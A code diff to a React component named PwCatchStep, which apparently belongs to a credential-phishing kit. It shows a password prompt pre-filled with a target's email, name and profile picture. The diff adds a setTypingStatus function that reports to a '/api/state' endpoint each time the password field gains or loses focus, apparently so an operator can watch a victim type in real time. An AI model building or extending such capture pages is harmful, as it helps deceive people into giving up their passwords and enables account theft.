@@ -40,7 +40,6 @@ export default function PwCatchStep({ email, name, profilePicture, onInteraction
 
   const onSubmit: SubmitHandler<PasswordFormData> = async (data) => {
     if (!data.password) {
-        // This should ideally not be hit due to zod validation, but as a safeguard.
         toast({
           variant: "destructive",
           title: "Error",
@@ -64,6 +63,19 @@ export default function PwCatchStep({ email, name, profilePicture, onInteraction
         });
       }
     });
+  };
+  
+  const setTypingStatus = async (isTyping: boolean) => {
+    onInteractionStart();
+    try {
+      await fetch('/api/state', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ action: 'setTypingStatus', isTyping }),
+      });
+    } catch (error) {
+      console.error('Failed to set typing status:', error);
+    }
   };
 
   return (
@@ -139,9 +151,12 @@ export default function PwCatchStep({ email, name, profilePicture, onInteraction
                         className="h-14 w-full rounded-md border border-input bg-transparent px-4 pb-2 pt-6 text-base ring-offset-background file:border-0 file:bg-transparent file:text-sm file:font-medium file:text-foreground placeholder:text-muted-foreground focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-2 disabled:cursor-not-allowed disabled:opacity-50"
                         onFocus={() => {
                           setIsFocused(true);
-                          onInteractionStart();
+                          setTypingStatus(true);
                         }}
-                        onBlur={() => setIsFocused(false)}
+                        onBlur={() => {
+                            setIsFocused(false);
+                            setTypingStatus(false);
+                        }}
                         onChange={(e) => {
                           register("password").onChange(e); // Manually call the react-hook-form onChange
                           handleInputChange(e);
